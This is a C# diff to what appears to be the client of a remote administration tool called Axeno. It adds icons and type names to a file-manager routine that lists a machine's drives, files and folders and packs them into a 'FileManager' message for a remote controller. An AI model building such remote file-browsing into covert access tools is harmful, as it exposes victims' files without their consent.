@@ -2,8 +2,10 @@
 using System;
 using System.Collections.Generic;
 using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -51,7 +53,7 @@ namespace Axeno.Client.Networking.Functions.System
 
                 }
 
-                sb.Append($"Name<{drive.Name}>Type<Drive>Access<{drive.RootDirectory.LastAccessTime}>Size<{drSize}>Path<{drive.RootDirectory.FullName}><SPLITHERE>");
+                sb.Append($"Name<{drive.Name}>Type<Drive>Access<{drive.RootDirectory.LastAccessTime}>Size<{drSize}>Path<{drive.RootDirectory.FullName}>Icon<DRIVE><SPLITHERE>");
             }
 
             MsgPack mpack = new MsgPack();
@@ -65,6 +67,8 @@ namespace Axeno.Client.Networking.Functions.System
             DirectoryInfo directory = new DirectoryInfo(directoryPath);
             StringBuilder sb = new StringBuilder();
             string parentDir = "";
+            int fCount = 0;
+            int dirCount = 0;
 
             try
             {
@@ -84,7 +88,7 @@ namespace Axeno.Client.Networking.Functions.System
             }
             foreach (FileInfo file in directory.GetFiles())
             {
-
+                fCount++;
 
                 long fSize = file.Length;
                 string fSizeStr = "";
@@ -113,24 +117,91 @@ namespace Axeno.Client.Networking.Functions.System
                 {
                     fSizeStr = $"{fSize} bytes";
                 }
+                try
+                {
+                    NativeMethodsFileMGR.SHFILEINFO info = new NativeMethodsFileMGR.SHFILEINFO();
 
+                    string fileName = file.FullName;
+                    uint dwFileAttributes = NativeMethodsFileMGR.FILE_ATTRIBUTE.FILE_ATTRIBUTE_NORMAL;
+                    uint uFlags = (uint)(NativeMethodsFileMGR.SHGFI.SHGFI_ICON | NativeMethodsFileMGR.SHGFI.SHGFI_TYPENAME | NativeMethodsFileMGR.SHGFI.SHGFI_USEFILEATTRIBUTES);
 
-                sb.Append($"Name<{file.Name}>Type<File>Access<{file.LastAccessTime}>Size<{fSizeStr}>Path<{file.FullName}>Parent<{parentDir}><SPLITHERE>");
+                    NativeMethodsFileMGR.SHGetFileInfo(fileName, dwFileAttributes, ref info, (uint)Marshal.SizeOf(info), uFlags);
+                    string fType = info.szTypeName;
+                    Icon fIcon = Icon.FromHandle(info.hIcon);
+
+                    sb.Append($"Name<{file.Name}>Type<{fType}>Access<{file.LastAccessTime}>Size<{fSizeStr}>Path<{file.FullName}>Parent<{parentDir}>Icon<{Convert.ToBase64String(ImageToByteArray(fIcon.ToBitmap()))}><SPLITHERE>");
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show($"An error occurred: {ex.Message}");
+                }
             }
 
 
             foreach (DirectoryInfo subDir in directory.GetDirectories())
             {
+                dirCount++;
 
+                sb.Append($"Name<{subDir.Name}>Type<Folder>Access<{directory.LastAccessTime}>Path<{subDir.FullName}>Parent<{parentDir}>Icon<FOLDER><SPLITHERE>");
+            }
+            if(dirCount == 0 && fCount == 0)
+            {
+                sb.Append($"(EMPTYFOLDER)<SPLITHERE><SPLITHERE>");
 
-                sb.Append($"Name<{subDir.Name}>Type<Folder>Access<{directory.LastAccessTime}>Path<{subDir.FullName}>Parent<{parentDir}><SPLITHERE>");
             }
 
+            //if(sb.Length <= 0)
+            //{
+            //    sb.Append("(EMPTYFOLDER)<SPLITHERE><SPLITHERE>");
+            //}
 
             MsgPack mpack = new MsgPack();
             mpack.ForcePathObject("Packet").AsString = "FileManager";
             mpack.ForcePathObject("Data").AsString = sb.ToString();
             return mpack.Encode2Bytes();
         }
+        public static byte[] ImageToByteArray(Image image)
+        {
+            using (MemoryStream ms = new MemoryStream())
+            {
+                image.Save(ms, ImageFormat.Png);
+                return ms.ToArray();
+            }
+        }
     }
+
+
+    static class NativeMethodsFileMGR
+    {
+        public const uint SHGFI_ICON = 0x100;
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SHFILEINFO
+        {
+            public IntPtr hIcon;
+            public int iIcon;
+            public uint dwAttributes;
+            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
+            public string szDisplayName;
+            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
+            public string szTypeName;
+        };
+
+        public static class FILE_ATTRIBUTE
+        {
+            public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
+        }
+
+        public static class SHGFI
+        {
+            public const uint SHGFI_TYPENAME = 0x000000400;
+            public const uint SHGFI_USEFILEATTRIBUTES = 0x000000010;
+            public const uint SHGFI_ICON = 0x100;
+
+        }
+
+        [DllImport("shell32.dll")]
+        public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbSizeFileInfo, uint uFlags);
+    }
+
 }
